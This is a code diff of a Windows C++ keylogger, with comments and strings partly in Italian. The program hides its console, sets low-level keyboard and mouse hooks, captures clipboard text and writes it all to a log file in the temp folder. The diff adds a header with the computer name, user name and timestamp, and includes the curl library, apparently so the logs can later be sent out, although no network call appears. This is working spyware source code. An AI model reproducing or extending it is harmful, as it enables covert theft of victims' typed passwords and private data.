@@ -3,6 +3,8 @@
 #include <string>
 #include <fstream>
 
+#include "include/curl/curl.h"
+
 #pragma comment(lib, "user32.lib") // user32.dll windows' library
 
 #define VK_0	0x30	// '0'
@@ -61,6 +63,7 @@ DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder
 const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
 
 std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
+std::string contentFile = ""; // save everything of what is been writing down
 
 // Keyboard hook
 static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -446,7 +449,8 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(g_hook, nCode, wParam, lParam);
 }
 
-static void checkPossibleCopy(std::string& testo)
+// Check if the clipboard is open and if there is a possible copy
+static void checkPossibleCopy(std::string& mess)
 {
 	if (OpenClipboard(NULL))
 	{
@@ -458,9 +462,9 @@ static void checkPossibleCopy(std::string& testo)
 			{
 				if (clipBoardLastSave != text)
 				{
-					testo.append("\n--Possibile copia con il mouse--\n");
-					testo.append(text);
-					testo.append("\n--/*FINE*\\--\n");
+					mess.append("\n--Possibile copia con il mouse--\n");
+					mess.append(text);
+					mess.append("\n--/*FINE*\\--\n");
 					clipBoardLastSave = text;
 				}
 				GlobalUnlock(hData);
@@ -498,16 +502,63 @@ static LRESULT CALLBACK MouseHookCallback(int nCode, WPARAM wParam, LPARAM lPara
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+// creating the string that will be written at the beginning of the file
+static std::string StartString()
+{
+	std::string startString = ""; // for the top of the file
+	std::time_t now = std::time(nullptr);
+	std::tm currentTime;
+	// obtaining the PC name
+	TCHAR pcname[MAX_COMPUTERNAME_LENGTH + 1];
+	DWORD pcname_len = sizeof(pcname) / sizeof(pcname[0]);
+	// PC name
+	startString = "\n------------------------------------\nNome Computer: ";
+	if (GetComputerName(pcname, &pcname_len)) {
+		std::string pcnameStr(pcname, pcname + pcname_len);
+		startString.append(pcnameStr);
+	}
+	else startString.append("Impossibile ottenere il nome del computer.");
+	// User Name
+	startString.append("\nNome utente: ");
+	TCHAR username[256];
+	DWORD username_len = sizeof(username) / sizeof(username[0]);
+	if (GetUserName(username, &username_len))
+	{
+		std::string usernameStr(username, username + username_len);
+		startString.append(usernameStr);
+	}
+	else startString.append("Impossibile ottenere il nome utente.");
+	// date & time
+	localtime_s(&currentTime, &now);
+	startString.append("\nDATA: ");
+	std::string day = std::to_string(currentTime.tm_mday);
+	std::string month = std::to_string(currentTime.tm_mon + 1);
+	std::string year = std::to_string(currentTime.tm_year + 1900);
+	std::string date = day.append("/").append(month).append("/").append(year);
+	startString.append(date);
+	startString.append("\nORA: ");
+	std::string hour = std::to_string(currentTime.tm_hour);
+	std::string minute = std::to_string(currentTime.tm_min);
+	std::string second = std::to_string(currentTime.tm_sec);
+	std::string time = hour.append(":").append(minute).append(":").append(second);
+	startString.append(time);
+	startString.append("\n------------------------------------\n");
+	return startString;
+}
+
 // main function
 int main()
 {
 	FreeConsole(); // disconnect the console when the program is running
-	
+
+	contentFile = StartString(); // update content file at start
+
 	HINSTANCE hInstance = GetModuleHandle(nullptr);
 	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
 	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, hInstance, 0);
 
 	if (g_hook == nullptr) return EXIT_FAILURE;
+	if (mouseHook == nullptr) return EXIT_FAILURE;
 
 	MSG msg;
 	while (GetMessage(&msg, nullptr, 0, 0))
